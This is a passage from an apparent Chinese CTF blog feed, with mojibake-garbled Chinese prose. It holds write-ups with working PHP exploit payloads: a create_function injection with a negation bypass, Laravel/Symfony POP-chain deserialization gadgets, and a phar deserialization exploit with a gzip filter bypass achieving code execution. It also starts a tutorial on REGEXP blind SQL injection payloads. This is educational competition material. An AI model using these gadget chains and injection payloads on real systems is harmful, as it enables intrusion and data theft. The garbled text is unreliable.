class="hljs-meta">%36</span><span class="hljs-meta">%34_</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span>(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span>]=create_function</code></pre><p>å¾—åˆ°ä¸ªå‡çš„</p><img src="/2021/08/04/ez/3.png" alt="3" style="zoom:67%;"><p>ä½¿ç”¨<code>~</code>å–åç»•è¿‡ï¼Œæœ€ç»ˆpayloadï¼š</p><p>åˆ©ç”¨ <code>require()</code> æœ¬åœ°æ–‡ä»¶åŒ…å« + ç”¨ä¼ªåè®®è¯»æºç </p><pre><code class="hljs xquery">?debu=aqua_is_cute<span class="hljs-meta">%0a</span>&amp;file=data://<span class="hljs-type">text</span>/plain,debu_debu_aqua&amp;shana[]=<span class="hljs-number">1</span>&amp;passwd[]=<span class="hljs-number">2</span>&amp;flag[arg]=&#125;;require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);var_dump(get_defined_vars());//&amp;flag[code]=create_function?<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75</span>=<span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61_is_</span><span class="hljs-meta">%63</span><span class="hljs-meta">%75</span><span class="hljs-meta">%74</span><span class="hljs-meta">%65</span><span class="hljs-meta">%0A</span>&amp;file=data://<span class="hljs-type">text</span>/plain,<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61</span>&amp;<span class="hljs-meta">%73</span><span class="hljs-meta">%68</span><span class="hljs-meta">%61</span><span class="hljs-meta">%6e</span><span class="hljs-meta">%61</span>[]=<span class="hljs-number">1</span>&amp;<span class="hljs-meta">%70</span><span class="hljs-meta">%61</span><span class="hljs-meta">%73</span><span class="hljs-meta">%73</span><span class="hljs-meta">%77</span><span class="hljs-meta">%64</span>[]=<span class="hljs-number">2</span>&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%61</span><span class="hljs-meta">%72</span><span class="hljs-meta">%67</span>]=;&#125;require(~(<span class="hljs-meta">%8f</span><span class="hljs-meta">%97</span><span class="hljs-meta">%8f</span><span class="hljs-meta">%c5</span><span class="hljs-meta">%d0</span><span class="hljs-meta">%d0</span><span class="hljs-meta">%99</span><span class="hljs-meta">%96</span><span class="hljs-meta">%93</span><span class="hljs-meta">%8b</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%d0</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%9e</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%c2</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%90</span><span class="hljs-meta">%91</span><span class="hljs-meta">%89</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%8b</span><span class="hljs-meta">%d1</span><span class="hljs-meta">%9d</span><span class="hljs-meta">%9e</span><span class="hljs-meta">%8c</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%c9</span><span class="hljs-meta">%cb</span><span class="hljs-meta">%d2</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%91</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%90</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%d0</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%8c</span><span class="hljs-meta">%90</span><span class="hljs-meta">%8a</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%c2</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%9e</span><span class="hljs-meta">%ce</span><span class="hljs-meta">%99</span><span class="hljs-meta">%93</span><span class="hljs-meta">%cb</span><span class="hljs-meta">%98</span><span class="hljs-meta">%d1</span><span class="hljs-meta">%8f</span><span class="hljs-meta">%97</span><span class="hljs-meta">%8f</span>));//&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span>]=create_function</code></pre><p><img src="/2021/08/04/ez/4.png" alt="4"></p><p>è§£ç å¾—åˆ°flagã€‚</p><h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h2><p>å‘ç‚¹1ï¼šä½¿ç”¨<code>require(base64_decode(cmVhMWZsNGcucGhw));</code>å¾—åˆ°å‡çš„flagï¼Œéœ€è¦å–åç»•è¿‡çš„åŸå› ï¼š</p><p><img src="/2021/08/04/ez/5.png" alt="5"></p><p>æœ€åç»“æœè§£ç åå¯ä»¥çœ‹åˆ°æ–‡ä»¶ä¸­æŠŠ<code>$rea1_f1114g</code>ç»™unsetäº†ï¼Œ</p><p><img src="/2021/08/04/ez/7.png" alt="7"></p><p>å› æ­¤ä¸èƒ½ç›´æ¥å¾—åˆ°flagå˜é‡ã€‚</p><p>å‘ç‚¹2ï¼š</p><p>ç»•è¿‡requestæ—¶éœ€è¦POST,GETåŒæ—¶ä¼ å‚ï¼Œå…¶ä½™çš„æ•°ç»„å´ä¸ç”¨ï¼Œå› ä¸ºæ•°ç»„è¾“å‡ºçš„ <code>$value</code> ä¸º Arrayï¼Œå¹¶æ²¡æœ‰è¢«æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚è¿™æ˜¯å› ä¸º <code>preg_match()</code> åªèƒ½åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•°ç»„å¾—ä»¥ç»•è¿‡ã€‚</p><p>å‘ç‚¹3ï¼š</p><p>è¿˜æ˜¯åœ¨ç»•è¿‡requestçš„æ—¶å€™ï¼Œä¸€ç›´ç»•ä¸è¿‡å»ï¼Œæˆ‘ä»¥ä¸ºæ˜¯payloadæ„é€ é”™äº†ï¼Œç„¶åå°±ç¿»éäº†å„ç§wpï¼Œç»“æœéƒ½ä¸è¡Œï¼Œæˆ‘è¿˜è¯•äº†å…¨ç¼–ç ï¼Œéƒ½ä¸è¡Œï¼Œæˆ‘è¿˜æ¢ä¸ªæµè§ˆå™¨ä¸€æ ·ä¸è¡Œï¼Œæœ€åæƒ³åˆ°ä¼˜å…ˆçº§cookieæ¯”è¾ƒé«˜ï¼Œæ‰¾äº†ä¸€ä¸‹å‘ç°</p><p><img src="/2021/08/04/ez/6.png" alt="6"></p><p>cookieé‡Œå‚¨å­˜ç€ä¹‹å‰é¢˜ç›®çš„å€¼ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚åˆ æ‰å°±å¯ä»¥äº†ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.gem-love.com/ctf/770.html">https://www.gem-love.com/ctf/770.html</a></p>]]></content>
    
    
    <categories>
      
      <category>create_functionä»£ç æ³¨å…¥</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuï¼ˆäº”ï¼‰</title>
    <link href="/2021/08/02/tiny/"/>
    <url>/2021/08/02/tiny/</url>
    
    <content type="html"><![CDATA[<h1>CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1</h1><p>laravelæ¡†æ¶ï¼Œé¢˜ç›®æä¾›æºç ï¼Œè¿˜æ˜¯è¦æ‰¾POPé“¾ï¼Œè¿˜æ˜¯å…ˆæœ<code>_destruct()</code>å»æ‰¾ä¸€ä¸ªååºåˆ—åŒ–çš„ç‚¹ï¼Œæœç´¢å‡ºçš„destructæœ‰å¾ˆå¤šï¼Œéœ€è¦ä¸€ä¸ªä¸ªè·Ÿè¿›åˆ¤æ–­å¯ä¸å¯ä»¥åˆ©ç”¨ï¼Œæ–‡ä»¶å¤ªå¤§ï¼Œæˆ‘å¹¶æ²¡æœ‰æ‰¾åˆ°ï¼Œå‚è€ƒå¤§ä½¬çš„<a href="https://xz.aliyun.com/t/5816#toc-3">wp</a>ï¼Œæ‰¾å‡ºTagAwareAdapterç±»ï¼š</p><p><img src="/2021/08/02/tiny/13.png" alt="13"></p><p><code>__destruct</code>æ–¹æ³•è°ƒç”¨commit()ï¼Œcommit()åˆè°ƒç”¨<code>invalidateTags([])</code>ï¼Œè·Ÿè¿›invalidateTagsæ–¹æ³•ï¼š</p><img src="/2021/08/02/tiny/14.png" alt="14" style="zoom:80%;"><p>è¿™é‡Œ<code>$this-&gt;pool</code>æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªç±»ä¸­æœ‰saveDeferredæ–¹æ³•çš„ç±»ï¼Œæ‰¾åˆ°ä¸€ä¸ªPhpArrayAdapterç±»ï¼š</p><p><img src="/2021/08/02/tiny/15.png" alt="15"></p><p>è·Ÿè¿›initializeè¿™ä¸ªæ–¹æ³•ï¼Œå‘ç°åœ¨æœ¬ç±»ä¸­å¹¶æ²¡æœ‰å®šä¹‰ï¼Œå¾—å»æ‰¾çˆ¶ç±»ï¼ŒPhpArrayAdapterç±»çš„ç»§æ‰¿å…³ç³»ï¼š</p><p><img src="/2021/08/02/tiny/16.png" alt="16"></p><p>çˆ¶ç±»çš„initializeæ–¹æ³•ï¼š</p><img src="/2021/08/02/tiny/17.png" alt="17" style="zoom:80%;"><p>åœ¨PhpArrayAdapterä¸­å®šä¹‰å¥½<code>$this-&gt;file</code>è¿™ä¸ªå˜é‡ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨initializeæ–¹æ³•çš„æ—¶å€™ï¼Œåªè¦è¿™ä¸ªfileæ˜¯ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶ï¼Œå°±ä¼šè°ƒç”¨includeæ¥åŒ…å«è¿›å»ï¼Œæœ€åå°±å¯ä»¥è¯»å–åˆ°flagäº†</p><p>payloadï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Cache</span>&#123;    <span class="hljs-title">final</span> <span class="hljs-title">class</span> <span class="hljs-title">CacheItem</span>&#123;    &#125;&#125;<span class="hljs-title">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Cache</span>\<span class="hljs-title">Adapter</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Cache</span>\<span class="hljs-title">CacheItem</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PhpArrayAdapter</span></span>&#123;        <span class="hljs-keyword">private</span> $file=<span class="hljs-string">&#x27;/flag&#x27;</span>;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TagAwareAdapter</span></span>&#123;        <span class="hljs-keyword">private</span> $deferred;        <span class="hljs-keyword">private</span> $pool;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;deferred = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;xxx&#x27;</span> =&gt; <span class="hljs-keyword">new</span> CacheItem());            <span class="hljs-keyword">$this</span>-&gt;pool = <span class="hljs-keyword">new</span> PhpArrayAdapter();        &#125;    &#125;$a=<span class="hljs-keyword">new</span> TagAwareAdapter();<span class="hljs-keyword">echo</span> urlencode(serialize($a));&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-comment">#è¿™ä¸¤ä¸ªç±»éƒ½æ˜¯åœ¨Symfony\Component\Cache\Adapterå‘½åç©ºé—´ä¸‹çš„</span><span class="hljs-comment">#è€ŒCacheitemç±»åˆ™ä¸åœ¨åŒä¸€ä¸ªç±»ä¸‹ã€‚æ‰€ä»¥æˆ‘ä»¬å¾—æ–°å»ºä¸€ä¸ªå‘½åç©ºé—´ã€‚å¹¶ä¸”useå¯¼å…¥</span></code></pre><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/5816#toc-6">https://xz.aliyun.com/t/5816#toc-6</a></p><h1>[HFCTF 2021 Final]tinypng</h1><p>æŸ¥çœ‹æºç ï¼Œè¿˜æ˜¯laravelæ¡†æ¶ï¼Œå…ˆå»çœ‹çœ‹è·¯ç”±å’Œæ§åˆ¶å™¨<img src="/2021/08/02/tiny/5.png" alt="5"></p><p>apiä¸‹æœ‰ä¸ªuserè·¯ç”±æš‚æ—¶æ²¡ä»€ä¹ˆç”¨ï¼Œçœ‹webçš„ï¼š</p><p><img src="/2021/08/02/tiny/6.png" alt="6"></p><p>indexè·¯ç”±æŒ‡å‘IndexControllerçš„fileUploadæ–¹æ³•ï¼Œimageè·¯ç”±æŒ‡å‘ImageControllerçš„handleæ–¹æ³•ã€‚</p><p>IndexControllerï¼š</p><p><img src="/2021/08/02/tiny/7.png" alt="7"></p><p><code>fileupload</code>èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ–‡ä»¶åç”±MD5(time())éšæœºç”Ÿæˆï¼Œæ–‡ä»¶ç±»å‹ä¸å¯æ§ï¼Œåªèƒ½ä¸ºpngï¼Œæ–‡ä»¶å¤§å°ä¹Ÿæœ‰è¦æ±‚ï¼Œä¸è¿‡å½±å“ä¸å¤§ã€‚ä¸”å†…å®¹ä¸èƒ½æœ‰<code>&lt;?| php|HALT_COMPILER</code>ã€‚</p><p>ImageControllerï¼š</p><p><img src="/2021/08/02/tiny/8.png" alt="8"></p><blockquote><p>explode()</p><p>æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">explode</span><span class="hljs-params">(separator,string,limit)</span></span></code></pre><table><thead><tr><th>separator</th><th>å¿…éœ€ã€‚è§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ã€‚</th></tr></thead><tbody><tr><td><em>string</em></td><td>å¿…éœ€ã€‚è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td><em>limit</em></td><td>å¯é€‰ã€‚è§„å®šæ‰€è¿”å›çš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚ å¯èƒ½çš„å€¼ï¼š  å¤§äº 0 - è¿”å›åŒ…å«æœ€å¤š <em>limit</em> ä¸ªå…ƒç´ çš„æ•°ç»„ å°äº 0 - è¿”å›åŒ…å«é™¤äº†æœ€åçš„ -<em>limit</em> ä¸ªå…ƒç´ ä»¥å¤–çš„æ‰€æœ‰å…ƒç´ çš„æ•°ç»„ 0 - è¿”å›åŒ…å«ä¸€ä¸ªå…ƒç´ çš„æ•°ç»„</td></tr></tbody></table></blockquote><p>ImageControlleræ–¹æ³•æ¥æ”¶äº†ä¸€ä¸ªå‚æ•°imageç„¶åexplodeå–åç¼€ï¼Œè¦æ±‚å¿…é¡»ä¸ºpngï¼›ç„¶åæŠŠ<code>$source</code>ä¼ å…¥imgcompressï¼š</p><p><img src="/2021/08/02/tiny/9.png" alt="9"></p><p><code>$this-&gt;src</code>å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„<code>$source</code>ï¼Œåªæ˜¯åç¼€ä¸å¯æ§ï¼Œç„¶åè°ƒç”¨äº†compressImgï¼Œè·Ÿè¿›_openImage()ï¼š</p><p><img src="/2021/08/02/tiny/10.png" alt="10"></p><p>åˆ°è¿™æ€è·¯å°±æ¸…æ™°äº†ï¼Œ<code>$this-&gt;src</code>å¯æ§ï¼Œä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶é€šè¿‡<code>getimagesize()</code>è§¦å‘pharååºåˆ—åŒ–å°±å¯ç”¨rceäº†ã€‚</p><p>expï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Routing</span>\<span class="hljs-title">Loader</span>\<span class="hljs-title">Configurator</span>&#123;<span class="hljs-title">class</span> <span class="hljs-title">ImportConfigurator</span>&#123;<span class="hljs-title">private</span> $<span class="hljs-title">parent</span>;<span class="hljs-keyword">private</span> $route;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$class</span>)</span>&#123;<span class="hljs-keyword">$this</span>-&gt;parent=$class;<span class="hljs-keyword">$this</span>-&gt;route=<span class="hljs-string">&#x27;test&#x27;</span>;&#125;&#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Mockery</span>&#123;<span class="hljs-title">class</span> <span class="hljs-title">HigherOrderMessage</span>&#123;<span class="hljs-title">private</span> $<span class="hljs-title">mock</span>;<span class="hljs-keyword">private</span> $method;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$class</span>)</span>&#123;<span class="hljs-keyword">$this</span>-&gt;mock=$class;<span class="hljs-keyword">$this</span>-&gt;method=<span class="hljs-string">&#x27;generate&#x27;</span>;&#125;&#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>&#123;<span class="hljs-title">final</span> <span class="hljs-title">class</span> <span class="hljs-title">MockTrait</span>&#123;<span class="hljs-title">private</span> $<span class="hljs-title">mockName</span>;<span class="hljs-keyword">private</span> $classCode;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">$this</span>-&gt;mockName=<span class="hljs-string">&#x27;123&#x27;</span>;<span class="hljs-keyword">$this</span>-&gt;classCode=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;&#125;&#125;&#125;<span class="hljs-keyword">namespace</span>&#123;<span class="hljs-title">use</span> \<span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Routing</span>\<span class="hljs-title">Loader</span>\<span class="hljs-title">Configurator</span>\<span class="hljs-title">ImportConfigurator</span>;<span class="hljs-keyword">use</span> \<span class="hljs-title">Mockery</span>\<span class="hljs-title">HigherOrderMessage</span>;<span class="hljs-keyword">use</span> \<span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>\<span class="hljs-title">MockTrait</span>;$c=<span class="hljs-keyword">new</span> MockTrait();$b=<span class="hljs-keyword">new</span> HigherOrderMessage($c);$a=<span class="hljs-keyword">new</span> ImportConfigurator($b);@unlink(<span class="hljs-string">&quot;phar.phar&quot;</span>);$phar=<span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>);$phar-&gt;startBuffering(); $phar-&gt;setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&quot;__HALT_COMPILER();&quot;</span>); $phar-&gt;setMetadata($a); $phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);$phar-&gt;stopBuffering();&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>expå¯ä»¥åœ¨phpggcçš„Laravelä¸‹æ‰¾åˆ°ï¼Œå¯ç”¨expç”Ÿæˆï¼Œä¹Ÿå¯ä»¥phpggcä¸€æŠŠæ¢­ï¼Œè¿˜è¦ç»•è¿‡ä¹‹å‰çš„é™åˆ¶</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/&lt;\?|php|HALT\_COMPILER/i&quot;</span>, $content ))&#123;    $error = <span class="hljs-string">&#x27;Don\&#x27;t do that, please&#x27;</span>;    <span class="hljs-keyword">return</span> back()&#125;</code></pre><p>ç”¨<code>gzip</code>æˆ–è€…<code>bzip2</code>å‹ç¼©çš„æ–¹å¼ç»•è¿‡å³å¯</p><p><img src="/2021/08/02/tiny/12.png" alt="12"></p><p>ä¸Šä¼ ï¼ŒæŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶ç±»å‹ï¼Œä¼šå¾—åˆ°æ–‡ä»¶åï¼Œåœ¨æºç ä¸­é€šè¿‡uploadså¯ä»¥æ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ åå‚¨å­˜çš„åœ°æ–¹ï¼š\html\storage\app\uploadsï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨imageè·¯ç”±ä¼ <code>phar://../storage/app/uploads/xxxxxxxxxxx.png</code></p><p><img src="/2021/08/02/tiny/2.png" alt="2"></p><p>æ”¹ä¸€ä¸‹å‘½ä»¤ï¼Œå†ä¼ ä¸€ä¸ªï¼š</p><p><img src="/2021/08/02/tiny/3.png" alt="3"></p><p>å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/239993#h2-4">https://www.anquanke.com/post/id/239993#h2-4</a></p>]]></content>
    
    
    <categories>
      
      <category>pharååºåˆ—åŒ–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Laravelæ¡†æ¶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>REGEXPæ³¨å…¥ä¸LIKEæ³¨å…¥</title>
    <link href="/2021/08/01/regexp/"/>
    <url>/2021/08/01/regexp/</url>
    
    <content type="html"><![CDATA[<h1>REGEXPæ³¨å…¥ä¸LIKEæ³¨å…¥</h1><h3 id="REGEXPæ³¨å…¥"><a class="header-anchor" href="#REGEXPæ³¨å…¥">ğŸ­</a>REGEXPæ³¨å…¥</h3><p>REGEXPæ³¨å…¥ï¼Œå³regexpæ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ï¼Œåˆå«ç›²æ³¨å€¼æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚</p><h4 id="æ³¨å…¥åŸç†"><a class="header-anchor" href="#æ³¨å…¥åŸç†">ğŸ­</a>æ³¨å…¥åŸç†</h4><p>ç›´æ¥æŸ¥è¯¢è‡ªå·±éœ€è¦çš„æ•°æ®ï¼Œç„¶åé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚</p><p>æ ¼å¼ï¼š</p><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span>è¯­å¥) regexp <span class="hljs-string">&#x27;æ­£åˆ™&#x27;</span></code></pre><p>è‹¥åŒ¹é…åˆ™è¿”å›1ï¼Œä¸åŒ¹é…è¿”å›0</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>) regexp <span class="hljs-string">&#x27;^a&#x27;</span>;</code></pre><p><code>^</code>è¡¨ç¤ºpattern(æ¨¡å¼ä¸²)çš„å¼€å¤´ã€‚å³è‹¥åŒ¹é…åˆ°usernameå­—æ®µä¸‹id=1çš„æ•°æ®å¼€å¤´ä¸ºaï¼Œåˆ™è¿”å›1ï¼›å¦åˆ™è¿”å›0</p><p>regexpå…³é”®å­—å¯ä»¥ä»£æ›¿whereæ¡ä»¶é‡Œçš„=å·</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span> regexp <span class="hljs-string">&#x27;^ad&#x27;</span>;</code></pre><img src="/2021/08/01/regexp/1.png" alt="1" style="zoom:80%;"><blockquote><p>è¿‡æ»¤äº†=ã€inã€likeæ—¶å¯ä½¿ç”¨ï¼Œ<code>^</code>è‹¥è¢«è¿‡æ»¤ï¼Œå¯ä½¿ç”¨<code>$</code>ä»åå¾€å‰è¿›è¡ŒåŒ¹é…</p></blockquote><p>å¸¸ç”¨regexpæ­£åˆ™è¯­å¥ï¼š</p><pre><code class="hljs sql">regexp &#x27;^[a-z]&#x27;  <span class="hljs-comment">#åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­</span>regexp &#x27;^r&#x27;      <span class="hljs-comment">#åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºr</span>regexp &#x27;^r[a-z]&#x27; <span class="hljs-comment">#åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­</span></code></pre><p>ç›²æ³¨ï¼š</p><pre><code class="hljs pgsql"><span class="hljs-string">&#x27; or database() regexp &#x27;</span>^s<span class="hljs-string">&#x27;--+ </span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">database</span>() regexp <span class="hljs-string">&#x27;y$&#x27;</span><span class="hljs-comment">--+ </span></code></pre><p>ç”¨åŒåæ–œæ ï¼ˆ<code>\\</code>ï¼‰æ¥å¼•ç”¨å…ƒå­—ç¬¦ï¼ˆå…·æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼‰</p><p>å¸¸ç”¨å¼•ç”¨å…ƒå­—ç¬¦ï¼š</p><table><thead><tr><th style="text-align:center">å­—ç¬¦</th><th style="text-align:left">ä½œç”¨</th></tr></thead><tbody><tr><td style="text-align:center">[]</td><td style="text-align:left">å·¦å³æ–¹æ‹¬å·ç”¨äºæŒ‡å®š<strong>å­—ç¬¦ç±»</strong>ã€‚å­—ç¬¦ç±»æ˜¯è¿›è¡ŒåŒ¹é…æ—¶æ‰€è¦ä¾æ®çš„ä¸€ç»„å­—ç¬¦ã€‚é™¤è¿å­—ç¬¦ (-) å’Œè„±å­—ç¬¦ (^) å¤–ï¼Œåœ¨å­—ç¬¦ç±»ä¸­æŒ‡å®šçš„å…ƒå­—ç¬¦å’Œé‡è¯ï¼ˆå¦‚ * å’Œ {m}ï¼Œåˆ†åˆ«ä¸ºå…ƒå­—ç¬¦å’Œé‡è¯ï¼‰æ²¡æœ‰ç‰¹æ®Šæ„ä¹‰ï¼Œå¯å½“ä½œå®é™…å­—ç¬¦è¿›è¡Œè¿ç®—ã€‚</td></tr><tr><td style="text-align:center">*</td><td style="text-align:left">æ˜Ÿå·å¯ç”¨äºä¸å­—ç¬¦åŒ¹é… 0 æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>REGEXP '.*abc'</code> åŒ¹é…çš„å­—ç¬¦ä¸²ä»¥ abc ç»“å°¾å¹¶ä»¥ä»»ä½•å‰ç¼€å¼€å¤´ã€‚å› æ­¤ï¼Œaabcã€xyzabc å’Œ abc åŒ¹é…ï¼Œä½† bc å’Œ abcc åˆ™ä¸åŒ¹é…ã€‚</td></tr><tr><td style="text-align:center">ï¼Ÿ</td><td style="text-align:left">é—®å·å¯ç”¨äºä¸å­—ç¬¦åŒ¹é… 0 æ¬¡æˆ– 1 æ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>'colou?r'</code> åŒ¹é… color å’Œ colourã€‚</td></tr><tr><td style="text-align:center">+</td><td style="text-align:left">åŠ å·å¯ç”¨äºä¸å­—ç¬¦åŒ¹é… 1 æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>'bre+'</code> åŒ¹é… bre å’Œ breeï¼Œä½†ä¸åŒ¹é… brã€‚</td></tr><tr><td style="text-align:center">-</td><td style="text-align:left">å¯ä»¥åœ¨å­—ç¬¦ç±»ä¸­ä½¿ç”¨ä¸€ä¸ªè¿å­—ç¬¦æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ã€‚ä¾‹å¦‚ï¼Œ<code>REGEXP '[a-e]'</code> åŒ¹é… aã€bã€cã€d å’Œ eã€‚</td></tr><tr><td style="text-align:center">%</td><td style="text-align:left">ç™¾åˆ†å·å¯ä¸ SIMILAR TO é…åˆä½¿ç”¨æ¥åŒ¹é…ä»»æ„æ•°ç›®çš„å­—ç¬¦ã€‚ä¸å°†ç™¾åˆ†å·è§†ä¸º REGEXP å’Œ REGEXP_SUBSTR æ‰€ä½¿ç”¨çš„å…ƒå­—ç¬¦ã€‚å½“æŒ‡å®šæ—¶ï¼Œå®ƒåŒ¹é…ç™¾åˆ†å· (%)ã€‚</td></tr><tr><td style="text-align:center">_</td><td style="text-align:left">å¯å°†ä¸‹åˆ’çº¿ä¸ SIMILAR TO é…åˆä½¿ç”¨æ¥åŒ¹é…å•ä¸ªå­—ç¬¦ã€‚ä¸å°†ä¸‹åˆ’çº¿è§†ä¸º REGEXP å’Œ REGEXP_SUBSTR 